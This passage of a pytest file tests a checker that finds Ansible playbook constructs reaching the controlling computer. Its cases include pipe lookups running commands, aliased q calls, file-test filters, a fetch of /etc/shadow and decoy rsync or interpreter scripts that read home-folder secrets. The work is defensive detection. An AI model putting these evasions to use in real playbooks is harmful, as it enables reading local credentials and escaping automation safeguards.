        "roles/one/tasks/main.yml: t: add_host, a group joined after the play's check of the connection",
    ),
    "a lookup in a role's argument specs": (
        {"roles/one/meta/argument_specs.yml": {"argument_specs": {"main": {"short_description": PIPE}}}},
        f"roles/one/meta/argument_specs.yml: a lookup LOOKUPS does not list, run here: {PIPE!r}",
    ),
    "a lookup in a role's argument specs as JSON": (
        {"roles/one/meta/argument_specs.json": '{"argument_specs": {"main": {"short_description": "' + PIPE + '"}}}'},
        f"roles/one/meta/argument_specs.json: a lookup LOOKUPS does not list, run here: {PIPE!r}",
    ),
    "a task's connection": (_in_one({**PING, "connection": "local"}), "roles/one/tasks/main.yml: t: connection"),
    "a block's delegate_to": (
        _in_one({"name": "b", "block": [PING], "delegate_to": "localhost"}),
        "roles/one/tasks/main.yml: b: delegate_to",
    ),
    "the play's connection": (
        {"playbooks/system.yml": _with(connection="local")},
        "playbooks/system.yml: the play's connection",
    ),
    "a role entry's connection": (
        {"playbooks/system.yml": _with(roles=[{"role": "one", "connection": "local"}])},
        "playbooks/system.yml: a role entry's connection",
    ),
    "a meta dependency's delegate_to": (
        {
            "roles/one/meta/main.yml": {"dependencies": [{"role": "two", "delegate_to": "localhost"}]},
            **_role_two(main=[PING]),
        },
        "roles/one/meta/main.yml: a role entry's delegate_to",
    ),
    "an include's apply": (
        {
            **_in_one({"name": "t", "include_tasks": {"file": "more.yml", "apply": {"delegate_to": "localhost"}}}),
            "roles/one/tasks/more.yml": [PING],
        },
        "roles/one/tasks/main.yml: t: its apply's delegate_to",
    ),
    "a fetch": (
        _in_one({"name": "t", "ansible.builtin.fetch": {"src": "/etc/shadow", "dest": "/tmp/x"}}),
        "roles/one/tasks/main.yml: t: ansible.builtin.fetch, which writes on this computer",
    ),
    "a play over this computer": (
        {"playbooks/system.yml": _with(hosts="localhost")},
        "playbooks/system.yml: a play over 'localhost', where layer 1's inventory is all",
    ),
    "a with_ loop": (
        _in_one({**PING, "with_pipe": ["id"]}),
        "roles/one/tasks/main.yml: t: with_pipe, a lookup run here: loop over it instead",
    ),
    # Review 67's 1: the lookup a with_ loop runs, named by ansible-core's private field over loop.
    "a loop's lookup named by loop_with": (
        _in_one({**PING, "loop": ["id"], "loop_with": "pipe"}),
        "roles/one/tasks/main.yml: t: loop_with, a private field of ansible-core's (loop_with runs its lookup here)",
    ),
    "a handler's loop_with": (
        {"roles/one/handlers/main.yml": [{**PING, "loop": ["x"], "loop_with": "file"}]},
        "roles/one/handlers/main.yml: t: loop_with, a private field of ansible-core's (loop_with runs its lookup here)",
    ),
    "a pipe lookup in a role": (
        _in_one({"name": "t", "ansible.builtin.debug": {"msg": PIPE}}),
        f"roles/one/tasks/main.yml: a lookup LOOKUPS does not list, run here: {PIPE!r}",
    ),
    "a query in a condition": (
        _in_one({**PING, "when": "query('ansible.builtin.pipe', 'id')"}),
        "roles/one/tasks/main.yml: a lookup LOOKUPS does not list, run here: \"query('ansible.builtin.pipe', 'id')\"",
    ),
    "a lookup in a role's defaults": (
        {"roles/one/defaults/main.yml": {"one_x": PIPE}},
        f"roles/one/defaults/main.yml: a lookup LOOKUPS does not list, run here: {PIPE!r}",
    ),
    "a lookup in a template": (
        {**_in_one(TEMPLATE_TASK), "roles/one/templates/x.j2": f"{PIPE}\n"},
        "roles/one/templates/x.j2: a lookup in a template",
    ),
    "q named apart from its call": (
        _in_one({"name": "t", "ansible.builtin.debug": {"msg": Q_APART}}),
        f"roles/one/tasks/main.yml: a lookup LOOKUPS does not list, run here: {Q_APART!r}",
    ),
    "q set to a name and called by it": (
        _in_one({"name": "t", "ansible.builtin.debug": {"msg": Q_SET}}),
        f"roles/one/tasks/main.yml: a lookup LOOKUPS does not list, run here: {Q_SET!r}",
    ),
    "q named apart in a condition": (
        _in_one({**PING, "when": "(q)('ansible.builtin.pipe', 'id')"}),
        "roles/one/tasks/main.yml: a lookup LOOKUPS does not list, run here: \"(q)('ansible.builtin.pipe', 'id')\"",
    ),
    # Review 67's 7: q handed on through a variable's value, and taken out of a list.
    "q through a variable's value": (
        _in_one({**_debug_of("{{ f('ansible.builtin.pipe', 'id') }}"), "vars": {"f": "{{ q }}"}}),
        "roles/one/tasks/main.yml: a lookup LOOKUPS does not list, run here: '{{ q }}'",
    ),
    "q taken out of a list": (
        _in_one({"name": "t", "ansible.builtin.debug": {"msg": "{{ [q][0]('ansible.builtin.pipe', 'id') }}"}}),
        f"{ONE}: a lookup LOOKUPS does not list, run here: \"{{{{ [q][0]('ansible.builtin.pipe', 'id') }}}}\"",
    ),
    # Review 67's 4: Jinja's file tests and the path filters, which Ansible runs here, by name and named to a filter.
    "a file test in a condition": (
        _in_one({**PING, "when": "'/etc/hostname' is exists"}),
        f"{ONE}: the test exists, which reads this computer's paths: \"'/etc/hostname' is exists\"",
    ),
    "a file test in an assert": (
        _in_one({"name": "a", "ansible.builtin.assert": {"that": ["'/x' is not mount"]}}),
        f"{ONE}: the test mount, which reads this computer's paths: \"'/x' is not mount\"",
    ),
    "a file test by its full name in a template": (
        {**_in_one(TEMPLATE_TASK), "roles/one/templates/x.j2": "{% if '/x' is not ansible.builtin.file %}y{% endif %}"},
        "roles/one/templates/x.j2: the test ansible.builtin.file, which reads this computer's paths",
    ),
    "a home filter in a message": (
        _in_one({"name": "t", "ansible.builtin.debug": {"msg": "{{ '~' | expanduser }}"}}),
        f"{ONE}: the filter expanduser, which reads this computer's paths: \"{{{{ '~' | expanduser }}}}\"",
    ),
    "a folder's names by fileglob": (
        _in_one({"name": "t", "ansible.builtin.debug": {"msg": "{{ '/etc/*' | ansible.builtin.fileglob }}"}}),
        f"{ONE}: the filter ansible.builtin.fileglob, which reads this computer's paths:"
        " \"{{ '/etc/*' | ansible.builtin.fileglob }}\"",
    ),
    "realpath in a condition": (
        _in_one({**PING, "when": "'/x' | realpath == '/x'"}),
        f"{ONE}: the filter realpath, which reads this computer's paths: \"'/x' | realpath == '/x'\"",
    ),
    "select given a file test": (
        _in_one({"name": "t", "ansible.builtin.debug": {"msg": "{{ ['/x'] | select('is_dir') }}"}}),
        f"{ONE}: select given is_dir, which reads this computer's paths: \"{{{{ ['/x'] | select('is_dir') }}}}\"",
    ),
    "selectattr given a file test": (
        _in_one(_debug_of("{{ [{'p': '/x'}] | selectattr('p', 'link_exists') }}")),
        f"{ONE}: selectattr given link_exists, which reads this computer's paths:"
        " \"{{ [{'p': '/x'}] | selectattr('p', 'link_exists') }}\"",
    ),
    "map given a path filter": (
        _in_one({"name": "t", "ansible.builtin.debug": {"msg": "{{ ['$HOME'] | map('ansible.builtin.expandvars') }}"}}),
        f"{ONE}: map given ansible.builtin.expandvars, which reads this computer's paths:"
        " \"{{ ['$HOME'] | map('ansible.builtin.expandvars') }}\"",
    ),
    "a test chosen at run time": (
        _in_one({"name": "t", "ansible.builtin.debug": {"msg": "{{ ['/x'] | reject(which) }}"}}),
        f"{ONE}: reject given a test or a filter by a name only a run can say: \"{{{{ ['/x'] | reject(which) }}}}\"",
    ),
    # Review 67's 8 and 12: what Ansible evaluates as an expression under no keyword of its own, debug's var and
    # assert's that in any form its parser takes, and a loop's break_when.
    "debug's var as a mapping": (
        _in_one({"name": "t", "ansible.builtin.debug": {"var": EXISTS}}),
        _said(EXISTS, FOUND_EXISTS),
    ),
    "debug's var given free-form": (
        _in_one({"name": "t", "ansible.builtin.debug": f'var="{EXISTS}"'}),
        _said(EXISTS, FOUND_EXISTS),
    ),
    "assert's that given free-form": (
        _in_one({"name": "a", "ansible.builtin.assert": f'that="{EXISTS}"'}),
        _said(EXISTS, FOUND_EXISTS),
    ),
    "a loop's break_when": (
        _in_one({**PING, "loop": [1, 2], "loop_control": {"break_when": [EXISTS]}}),
        _said(EXISTS, FOUND_EXISTS),
    ),
    # Review 67's 9: a condition read as Ansible evaluates it, an expression wherever an opener stands in it.
    "a condition with a comment's opener in it": (_in_one({**PING, "when": COMMENTED}), _said(COMMENTED, FOUND_EXISTS)),
    "a template in a string of a condition": (_in_one({**PING, "when": EMBEDDED}), _said(EMBEDDED, FOUND_EXISTS)),
    "a condition made of one template": (_in_one({**PING, "when": "{{ check }}"}), _said("{{ check }}", WHOLE)),
    "an assert's that made of one template": (
        _in_one({"name": "a", "ansible.builtin.assert": {"that": "{{ checks }}"}}),
        _said("{{ checks }}", WHOLE),
    ),
    # Review 67's 10: a name given by *, and one given to a filter that a filter of BY_NAME is given by its name.
    "select given its test by *": (
        _in_one(_debug_of("{{ ['/x'] | select(*['exists']) }}")),
        _said("{{ ['/x'] | select(*['exists']) }}", "select given its arguments by * or **, a name only a run can say"),
    ),
    "selectattr given its test by *": (
        _in_one(_debug_of("{{ [{'p': '/x'}] | selectattr('p', *['exists']) }}")),
        _said(
            "{{ [{'p': '/x'}] | selectattr('p', *['exists']) }}",
            "selectattr given its arguments by * or **, a name only a run can say",
        ),
    ),
    "map given select, given a file test": (
        _in_one(_debug_of("{{ [['/x']] | map('select', 'exists') }}")),
        _said("{{ [['/x']] | map('select', 'exists') }}", "select given exists, which reads this computer's paths"),
    ),
    "map given map, given a path filter": (
        _in_one(_debug_of("{{ [['/x/*']] | map('map', 'fileglob') }}")),
        _said("{{ [['/x/*']] | map('map', 'fileglob') }}", "map given fileglob, which reads this computer's paths"),
    ),
    # Review 67's 11: core's test that opens a file here, outside the files plugin.
    "core's vaulted_file in a condition": (
        _in_one({**PING, "when": "not ('/x' is vaulted_file)"}),
        _said("not ('/x' is vaulted_file)", "the test vaulted_file, which reads this computer's paths"),
    ),
    "q named apart in a template": (
        {**_in_one(TEMPLATE_TASK), "roles/one/templates/x.j2": f"{Q_APART}\n"},
        "roles/one/templates/x.j2: a lookup in a template",
    ),
}


@pytest.mark.parametrize("road", sorted(COMPUTER_ROADS))
def test_what_would_run_or_write_on_this_computer_is_found(tmp_path: Path, road: str) -> None:
    changes, said = COMPUTER_ROADS[road]
    assert reaching_this_computer(_planted(tmp_path, changes), tmp_path, lookups={}) == [said]


def test_a_rendered_string_jinja_cannot_read_is_refused(tmp_path: Path) -> None:
    # Its tests and filters cannot be said, so the string is: the fourth test fails closed, whatever Jinja's words.
    play = _planted(tmp_path, _in_one({**PING, "when": "'/x' is"}))
    [said] = reaching_this_computer(play, tmp_path, lookups={})
    assert said.startswith(f"{ONE}: a template Jinja cannot read, which the walk cannot hold (")
    assert said.endswith(": \"'/x' is\"")


def test_a_lookup_is_held_to_its_file_and_whole_string(tmp_path: Path) -> None:
    listed = {("roles/one/tasks/main.yml", PIPE): "a read"}
    play = _planted(tmp_path, _in_one({"name": "t", "ansible.builtin.debug": {"msg": PIPE}}))
    assert reaching_this_computer(play, tmp_path, lookups=listed) == []
    # Listed, and no longer there: take it out.
    play = _planted(tmp_path, _in_one(PING))
    assert reaching_this_computer(play, tmp_path, lookups=listed) == [
        f"roles/one/tasks/main.yml: in LOOKUPS, and no longer there: {PIPE!r}"
    ]
    # The same lookup in another string, or another file, is another.
    play = _planted(tmp_path, _in_one({"name": "t", "ansible.builtin.debug": {"msg": f"x {PIPE}"}}))
    assert len(reaching_this_computer(play, tmp_path, lookups=listed)) == 2


# ------------------------------------------------------------------------------- the roads at run time ----


@pytest.fixture
def made(home: Path) -> Iterator[jobs.Job]:
    """A job of this process's own with its run's directory, as the run that starts layer 1 has; both gone after."""
    job = jobs.create(
        paths.jobs_dir(paths.home(REPO)), "deploy", "deploy alpha", "pve", ["alpha"], {"kind": "terminal"}, True
    )
    rundir.make(job)
    yield job
    rundir.remove(job)
    jobs.drop(job)


def _collections() -> Path:
    """The folder of collections the run's environment names (ANSIBLE_COLLECTIONS_PATH, as just test gives it) that
    holds ansible.posix until F6a: the road that runs a collection's code needs it."""
    for folder in os.environ.get("ANSIBLE_COLLECTIONS_PATH", "").split(os.pathsep):
        if folder and (Path(folder) / "ansible_collections" / "ansible" / "posix").is_dir():
            return Path(folder)
    raise AssertionError("no folder of ANSIBLE_COLLECTIONS_PATH holds ansible.posix: run the tests through just")


def _findings(play: Path, repo: Path) -> str:
    """What the four tests say of play's tree, no reason or lookup listed: Unfollowed's sentence, or each finding."""
    try:
        said = [*map(str, commands(play, repo).items()), *map(str, outside(play, repo).items())]
        return "\n".join(said + setting_connection_variables(play, repo) + reaching_this_computer(play, repo, {}))
    except Unfollowed as unfollowed:
        return str(unfollowed)


def _touch(mark: Path) -> str:
    """A lookup that runs here and leaves mark: what each decoy runs."""
    return f"{{{{ lookup('ansible.builtin.pipe', 'touch {mark}') }}}}"


def _quick(**keys: object) -> dict[str, object]:
    """BASE's play with keys of its own and no facts gathered, as a run on a stand-in has it."""
    return {"playbooks/system.yml": _with(gather_facts=False, **keys)}


def _debug(msg: str) -> dict[str, object]:
    """BASE's play with a debug of msg of its own, which Ansible renders."""
    return _quick(tasks=[{"name": "d", "ansible.builtin.debug": {"msg": msg}}])


def _secret(mark: Path) -> str:
    """A file of this computer's in the test's own folder, beside mark, that a copy would send: its path."""
    secret = mark.parent / "secret"
    secret.write_text("local-secret\n")
    return str(secret)


def _interpreter(mark: Path, alpha: Machine) -> str:
    """A decoy of the machine's interpreter in the test's own folder, which leaves mark and runs the machine's own."""
    text = f'#!/bin/sh\ntouch "{mark}"\nexec "{alpha.home / "python"}" "$@"\n'
    return str(_executable(mark.parent / "decoy-python", text))


def _rsync(mark: Path, alpha: Machine) -> str:
    """A decoy rsync first on the PATH the machine's modules run with, which leaves mark: the folder to send."""
    _executable(alpha.bin / "rsync", f'#!/bin/sh\ntouch "{mark}"\n')
    source = mark.parent / "source"
    source.mkdir()
    return f"{source}/"


def _at_home(name: str, text: str) -> str:
    """A file of the person's home, the test's own (engine_guard's HOME), holding text: ~/name, which reaches it."""
    (Path(os.environ["HOME"]) / name).write_text(text)
    return f"~/{name}"


def _home_copy(mark: Path) -> dict[str, object]:
    """A role's copy of ~/x to mark: the home's x is the one file of that name."""
    source = _at_home("zr-secret", "home-secret\n")
    return {**_quick(), **_in_one({"name": "c", "ansible.builtin.copy": {"src": source, "dest": str(mark)}})}


def _home_template(mark: Path) -> dict[str, object]:
    """A role's template of ~/x.j2, the home's leaving mark, beside a role's own of that name that does not."""
    source = _at_home("zr-home.j2", f"{_touch(mark)}\n")
    task = {"name": "t", "ansible.builtin.template": {"src": source, "dest": str(mark.parent / "out")}}
    return {**_quick(), **_in_one(task), "roles/one/templates/~/zr-home.j2": "decoy\n"}


def _home_include(mark: Path) -> dict[str, object]:
    """A role's include of ~/x.yml, the home's a copy to mark, beside a role's own of that name that is a ping."""
    tasks = [{"name": "home", "ansible.builtin.copy": {"content": "ran", "dest": str(mark)}}]
    source = _at_home("zr-home.yml", json.dumps(tasks))
    return {
        **_quick(),
        **_in_one({"name": "i", "ansible.builtin.include_tasks": source}),
        "roles/one/tasks/~/zr-home.yml": [PING],
    }


def _template(mark: Path, text: str, **args: str) -> dict[str, object]:
    """A role's template task that renders x.j2, holding text, with args, beside y.j2, whose lookup leaves mark."""
    task = {"name": "t", "ansible.builtin.template": {"src": "x.j2", "dest": str(mark.parent / "out"), **args}}
    return {
        **_quick(),
        **_in_one(task),
        "roles/one/templates/x.j2": text,
        "roles/one/templates/y.j2": f"{_touch(mark)}\n",
    }


def _defaults_copy(mark: Path, alpha: Machine) -> dict[str, object]:
    """A copy of no src of its own, given one by its task's module_defaults: a file of this computer."""
    defaults = {"ansible.builtin.copy": {"src": _secret(mark)}}
    return _quick(tasks=[{"name": "c", "ansible.builtin.copy": {"dest": str(mark)}, "module_defaults": defaults}])


def _defaults_block(mark: Path, alpha: Machine) -> dict[str, object]:
    """The same copy in a block, whose module_defaults give it its src."""
    defaults = {"ansible.builtin.copy": {"src": _secret(mark)}}
    copy = {"name": "c", "ansible.builtin.copy": {"dest": str(mark)}}
    block = {"name": "b", "block": [copy], "module_defaults": defaults}
    return _quick(tasks=[block])


def _args_copy(mark: Path, alpha: Machine) -> dict[str, object]:
    """The same copy, its src given by args: as one template."""
    given = {"src": _secret(mark)}
    copy = {"name": "c", "ansible.builtin.copy": {"dest": str(mark)}, "args": "{{ given }}", "vars": {"given": given}}
    return _quick(tasks=[copy])


def _templated_copy(mark: Path, alpha: Machine) -> dict[str, object]:
    """A copy given one template as its arguments, which ansible-core renders into them: a file of this computer's."""
    given = {"src": _secret(mark), "dest": str(mark)}
    return _quick(tasks=[{"name": "c", "ansible.builtin.copy": "{{ given }}", "vars": {"given": given}}])


def _args_fact(mark: Path, alpha: Machine) -> dict[str, object]:
    """A fact of the machine's interpreter, a decoy's, given by args as one template, then a task that runs it."""
    given = {"ansible_python_interpreter": _interpreter(mark, alpha)}
    fact = {"name": "f", "ansible.builtin.set_fact": {"one_y": 1}, "args": "{{ given }}", "vars": {"given": given}}
    return _quick(tasks=[fact, PING])


def _defaults_fact(mark: Path, alpha: Machine) -> dict[str, object]:
    """The same fact given by the task's module_defaults."""
    defaults = {"ansible.builtin.set_fact": {"ansible_python_interpreter": _interpreter(mark, alpha)}}
    fact = {"name": "f", "ansible.builtin.set_fact": {"one_y": 1}, "module_defaults": defaults}
    return _quick(tasks=[fact, PING])


def _synchronize(mark: Path, alpha: Machine) -> dict[str, object]:
    """A name of ansible.builtin that ansible-core routes to ansible.posix, whose rsync runs."""
    task = {"name": "s", "ansible.builtin.synchronize": {"src": _rsync(mark, alpha), "dest": str(mark.parent / "to")}}
    return _quick(tasks=[task])


def _two_below(mark: Path, alpha: Machine) -> dict[str, object]:
    """A play-level file reached one below the play, then two below, where its import is looked for beside the play:
    the file there a copy to mark."""
    imports = [
        {"name": "a", "ansible.builtin.import_tasks": "tasks/a.yml"},
        {"name": "shared", "ansible.builtin.import_tasks": "tasks/shared.yml"},
    ]
    return {
        **_quick(pre_tasks=imports),
        "playbooks/tasks/shared.yml": [{"name": "i", "ansible.builtin.import_tasks": "a.yml"}],
        "playbooks/tasks/a.yml": [{"name": "j", "ansible.builtin.import_tasks": "b.yml"}],
        "playbooks/tasks/b.yml": [PING],
        "playbooks/b.yml": [{"name": "beside", "ansible.builtin.copy": {"content": "ran", "dest": str(mark)}}],
    }


def _loop_with(mark: Path, alpha: Machine) -> dict[str, object]:
    """A loop over one command, which the pipe lookup that loop_with names runs here."""
    task = {"name": "d", "ansible.builtin.debug": {"msg": "{{ item }}"}, "loop": [f"touch {mark}"], "loop_with": "pipe"}
    return _quick(tasks=[task])


def _linked_files(mark: Path, alpha: Machine) -> dict[str, object]:
    """A role whose files/ is a link to a folder of this computer's, in the test's own folder, whose file a copy
    sends."""
    elsewhere = mark.parent / "elsewhere"
    elsewhere.mkdir()
    (elsewhere / "secret").write_text("local-secret\n")
    files = mark.parent / "tree" / "roles" / "one" / "files"
    files.parent.mkdir(parents=True)
    files.symlink_to(elsewhere)
    return {**_quick(), **_in_one({"name": "c", "ansible.builtin.copy": {"src": "secret", "dest": str(mark)}})}


# Review 61's roads, and review 67's that ran, each run as Ansible runs it: the tree it is planted as, given the mark
# its decoy leaves and the stand-in machine, and what the four tests say of that tree.
RUN_ROADS: dict[str, tuple[Callable[[Path, Machine], dict[str, object]], str]] = {
    "a task's module_defaults gives a copy its src": (_defaults_copy, "module_defaults"),
    "a block's module_defaults gives a copy its src": (_defaults_block, "module_defaults"),
    "args given as one template give a copy its src": (_args_copy, "args given as one template"),
    "a copy given one template as its arguments": (_templated_copy, "given one template as its arguments"),
    "a fact given by args as one template sets the interpreter": (_args_fact, "args given as one template"),
    "a fact given by module_defaults sets the interpreter": (_defaults_fact, "module_defaults"),
    "ansible.builtin.synchronize runs rsync": (_synchronize, "which ansible-core routes to ansible.posix.synchronize"),
    "a copy of ~/x sends the home's file": (lambda mark, alpha: _home_copy(mark), "starts with ~"),
    "a template of ~/x.j2 renders the home's": (lambda mark, alpha: _home_template(mark), "starts with ~"),
    "an include of ~/x.yml runs the home's": (lambda mark, alpha: _home_include(mark), "starts with ~"),
    "q named apart from its call": (
        lambda mark, alpha: _debug(f"{{{{ (q)('ansible.builtin.pipe', 'touch {mark}') }}}}"),
        "a lookup LOOKUPS does not list",
    ),
    "q set to a name and called by it": (
        lambda mark, alpha: _debug(f"{{% set f = q %}}{{{{ f('ansible.builtin.pipe', 'touch {mark}') }}}}"),
        "a lookup LOOKUPS does not list",
    ),
    "a template task's own delimiters": (
        lambda mark, alpha: _template(mark, "[% include 'y.j2' %]\n", **SQUARE),
        "a template's own delimiters",
    ),
    "a template's #jinja2: line": (
        lambda mark, alpha: _template(mark, f"{HEADER}[% include 'y.j2' %]\n"),
        "sets its own delimiters",
    ),
    "an include in a task's string": (
        lambda mark, alpha: {**_debug("{% include 'x.j2' %}"), "playbooks/x.j2": f"{_touch(mark)}\n"},
        "names another template",
    ),
    "an import two below the play, the file reached one below first": (_two_below, "two files below the play"),
    "a loop's lookup named by loop_with": (_loop_with, "loop_with, a private field of ansible-core's"),
    "a role's files/ a link to a folder elsewhere": (_linked_files, "a role's folder that is a link"),
}


@pytest.mark.parametrize("road", sorted(RUN_ROADS))
def test_each_road_review_61_ran_is_found_and_is_one_ansible_takes(
    made: jobs.Job, tmp_path: Path, monkeypatch: pytest.MonkeyPatch, road: str
) -> None:
    # Planted under the test's own folder, its roles the run's: found by the four tests, then run by layer1.run over
    # the test-only local connection on a stand-in machine, where its decoy leaves the mark in the test's own folder.
    alpha = machine(tmp_path / "machines", "alpha")
    filed(alpha)
    mark = tmp_path / "ran"
    planted, said = RUN_ROADS[road]
    root = tmp_path / "tree"
    play = _planted(root, planted(mark, alpha))
    findings = _findings(play, root)
    assert said in findings, findings
    monkeypatch.setattr(layer1, "ROLES", root / "roles")
    ended = asyncio.run(
        layer1.run(
            made,
            target(alpha),
            play,
            name="alpha",
            host_flag="",
            env=dict(os.environ),
            test_connection=layer1_host(alpha),
            test_collections=_collections(),
        )
    )
    assert mark.exists(), ended.said
